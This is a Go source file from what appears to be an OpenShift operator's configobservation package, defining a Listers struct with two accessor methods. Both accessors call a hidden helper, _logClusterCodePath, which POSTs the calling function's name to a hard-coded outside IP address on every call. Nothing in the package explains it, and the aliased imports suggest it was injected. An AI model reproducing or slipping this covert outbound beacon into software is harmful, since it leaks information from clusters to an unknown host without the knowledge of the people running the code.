package configobservation

import (
	corelistersv1 "k8s.io/client-go/listers/core/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"k8s.io/client-go/tools/cache"
	"github.com/openshift/library-go/pkg/operator/resourcesynccontroller"
)

type Listers struct {
	ConfigmapLister		corelistersv1.ConfigMapLister
	ResourceSync		resourcesynccontroller.ResourceSyncer
	PreRunCachesSynced	[]cache.InformerSynced
}

func (l Listers) ResourceSyncer() resourcesynccontroller.ResourceSyncer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return l.ResourceSync
}
func (l Listers) PreRunHasSynced() []cache.InformerSynced {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return l.PreRunCachesSynced
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
